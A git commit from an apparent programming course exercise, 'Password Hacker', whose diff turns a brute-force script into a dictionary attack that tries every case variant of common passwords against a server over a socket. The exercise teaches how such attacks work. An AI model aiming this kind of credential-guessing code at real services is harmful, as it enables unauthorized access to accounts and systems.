678557a92493621d2bab6039b6235284a4caa419
Alejandro RM <alejandror45@gmail.com>
2023-07-28 23:52:35 -0600

    Stage 3/5: Smarter, dictionary-based brute force   The admin has picked up on our attempts to access the server, so now it is protected with a more complex password. Maybe the password is long but not unique? Let's hack it using a dictionary of the most common passwords!

--- Password Hacker (Python)/task/hacking/hack.py
+++ Password Hacker (Python)/task/hacking/hack.py
@@ -1,22 +1,26 @@
 import itertools
+import os
 import socket
 import sys
-from string import ascii_lowercase, digits
 
 ip_address = sys.argv[1]
 port = int(sys.argv[2])
-
-chars = list(''.join((ascii_lowercase, digits)))
 
 with socket.socket() as client_socket:
     address = (ip_address, port)
     client_socket.connect(address)
 
-    for i in range(1, 4):
-        combinations = itertools.product(chars, repeat=i)
-        for combination in combinations:
-            password = "".join(combination)
-            client_socket.send(password.encode('utf8'))
-            response = client_socket.recv(1024)
-            if response.decode('utf8') == 'Connection success!':
-                print(password)
+    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"), "r") as file:
+        for word in file:
+            word = word.strip()
+            product = itertools.product(*zip(word.upper(), word.lower()))
+            unique_combinations = set(''.join(item) for item in product)
+            for password in unique_combinations:
+                try:
+                    client_socket.send(password.encode('utf8'))
+                    response = client_socket.recv(1024).decode('utf8')
+                    if response == 'Connection success!':
+                        print(password)
+                        break
+                except:
+                    pass
